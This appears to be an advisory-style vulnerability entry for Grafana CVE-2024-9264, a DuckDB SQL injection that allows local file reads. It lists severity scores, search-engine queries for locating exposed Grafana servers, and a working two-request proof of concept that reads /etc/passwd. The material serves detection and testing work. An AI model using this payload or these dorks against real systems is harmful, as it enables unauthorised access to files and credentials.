---
layout: post
cve_id: CVE-2024-9264
title: Grafana Post-Auth DuckDB - SQL Injection To File Read
pcap: true
pcap_path: /pcaps/2024/CVE-2024-9264.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2024/CVE-2024-9264.yaml
snort2_rule: N/A
snort3_rule: N/A
author: princechaddha
severity: critical
impact: 'Authenticated users with VIEWER or higher permissions can exploit SQL injection
  to read local files and execute commands through duckdb queries when the duckdb
  binary is present, potentially exposing sensitive configuration files and credentials.

  '
remediation: 'Apply the vendor-supplied patch or upgrade to a non-vulnerable version.

  '
reference:
- https://x.com/nol_tech/status/1847639874909749443
- https://github.com/fkie-cad/nvd-json-data-feeds
- https://nvd.nist.gov/vuln/detail/CVE-2024-9264
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H
  cvss-score: 9.9
  cve-id: CVE-2024-9264
  cwe-id: CWE-94
  epss-score: 0.93989
  epss-percentile: 0.99882
metadata:
  max-request: 2
  vendor: grafana
  product: grafana
  shodan-query:
  - http.title:"grafana"
  - cpe:"cpe:2.3:a:grafana:grafana"
  fofa-query:
  - app="grafana"
  - title="grafana"
  google-query: intitle:"grafana"
tags:
- cve
- cve2024
- grafana
- sqli
- lfr
- authenticated
- vuln
---

## üîç Vulnerability Description
The SQL Expressions experimental feature of Grafana allows for the evaluation of `duckdb` queries containing user input. These queries are insufficiently sanitized before being passed to `duckdb`, leading to a command injection and local file inclusion vulnerability. Any user with the VIEWER or higher permission is capable of executing this attack. The `duckdb` binary must be present in Grafana's $PATH for this attack to function; by default, this binary is not installed in Grafana distributions.


## üåê HTTP Request
```nohighlight
POST /login HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh, Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/19.0 Safari/605.1.15
Connection: close
Content-Length: 37
content-type: application/json
Accept-Encoding: gzip
{"user":"oHZbSX","password":"0MLCsz"}
```

```nohighlight
POST /api/ds/query?ds_type=__expr__&expression=true&requestId=Q101 HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0
Connection: close
Content-Length: 367
Content-Type: application/json
Accept-Encoding: gzip
{
"from": "1729313027261",
"queries": [
{
"datasource": {
"name": "Expression",
"type": "__expr__",
"uid": "__expr__"
},
"expression": "SELECT content FROM read_blob('/etc/passwd')",
"hide": false,
"refId": "B",
"type": "sql",
"window": ""
}
],
"to": "1729334627261"
}
```

